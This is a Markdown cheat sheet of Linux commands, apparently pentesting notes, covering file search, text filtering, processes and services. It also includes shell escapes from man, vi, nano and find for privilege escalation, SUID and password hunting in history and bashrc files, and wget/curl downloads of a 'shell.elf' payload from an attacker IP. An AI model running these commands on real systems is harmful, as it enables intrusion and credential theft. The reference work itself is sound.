# Commands

## Manual page guide

``` bash 
man <key search>
```

``` bash
man -k '^passwd$'
```

In Manual page, execute `!/bin/bash` to spawn a shell.

## File Permissions

### Unix Filesystem

<a href='https://en.wikipedia.org/wiki/Unix_filesystem' target="blank">Wiki Unix filesystem</a>

- /bin - basic programs (ls, cd, cat, etc.)
- /sbin - system programs (fdisk, mkfs, sysctl, etc)
- /etc - configuration files
- /tmp - temporary files (typically deleted on boot)
- /usr/bin - applications (apt, ncat, nmap, etc.)
- /usr/share - application support and data files

View the file's permssion

=== "stat"

	``` bash
	stat myfile
	```

=== "ls"

	``` bash
	ls -l myfile
	```


## Play with text and files

### Terminal editor

=== "vi"

	``` bash
	vi -c ':!/bin/sh' /dev/null
	```

	``` bash
	vi
	:set shell=/bin/sh
	:shell
	```

=== "nano"

	``` bash
	nano
	^R^X
	reset; sh 1>&0 2>&0
	```

	``` bash
	sudo nano /var/opt/../../etc/sudoers
	```

### Finding

=== "finding files"

	``` bash
	find / -name "<name>"
	```

===	"history, bashrc, backup"

	``` bash
	find / -name *history* 2>/dev/null
	find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
	```

===	"Binaries That AutoElevate"

	``` bash
	find / -perm -u=s -type f 2>/dev/null
	```

=== "Spawn shell"

	``` bash
	find . -exec /bin/sh \;
	```

### Downloading

=== "wget"

	``` bash
	wget -O /tmp/shell http://192.168.110.131/shell.elf
	
	wget <uri> -P /path/to/
	```

=== "curl"

	``` bash
	curl -o /tmp/shell http://192.168.110.131/shell.elf
	```

=== "axel"

	``` bash
	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
	```

### Output Filtering

=== "sed"

	``` bash
	sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //'
	```

=== "cut"

	``` bash
	echo "hacking, penetration testing and bug hunting"| cut -f 2 -d " "
	```

	``` bash
	cut -d ":" -f 1 /etc/passwd
	```

=== "awk"

	``` bash
	cat /etc/passwd | awk -F ":" '{print $1, ":", $7}' | grep "sh"
	```

=== "uniq -c"

	``` bash
	cat list.txt | sort | uniq -c | sort -r
	```

=== "grep"

	``` bash
	ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '
	```

	``` bash
	grep -v "Nmap"
	```

### Redirect

=== "save file using cat"

	``` bash
	cat > filename <<EOL

	Some text content
	Some text content 2
	Some text content 3

	EOL
	```

=== "to a New File"

	``` bash
	ls > list.txt
	```

	``` bash
	cat list.txt
	Desktop
	Documents
	list.txt
	```

=== "to an Existing File"

	``` bash
	echo "Add new" >> list.txt
	```

=== "from a File"

	``` bash
	wc -m < list.txt
	```

=== "STDERR"

	``` bash
	find / -perm -u=s -type f 2>/dev/null
	```

## Processes

### Running services and kill

``` bash
ps -ef
```

``` bash
ps aux
```

``` bash
ps -fC <process-name>
```

``` bash
kill <id>
```

Checking running services

``` bash
sudo ss -antlp
```

Checking all available services

``` bash
systemctl list-unit-files
```

### Monitoring

=== "tail"

	``` bash
	sudo tail -f /var/log/apache2/access.log
	```

=== "watch"

	``` bash
	watch -n 1 <command>
	```

### SSH Service

``` bash
sudo systemctl start ssh
```

Start SSH service automatically at boot time.

``` bash
sudo systemctl enable ssh
```

### Web Service

Apache2

``` bash
sudo systemctl start apache2
```

Python

``` bash
python3 -m http.server 80
```

``` bash
python -m SimpleHTTPServer 80
```

php

``` bash
php -S 0.0.0.0:80
```

busybox

``` bash
busybox httpd -f -p 80
```

Start HTTP service automatically at boot time.

``` bash
sudo systemctl enable apache2
```

## Screenshot


``` bash
cutycapt --url=$ip --out=$ip.png
```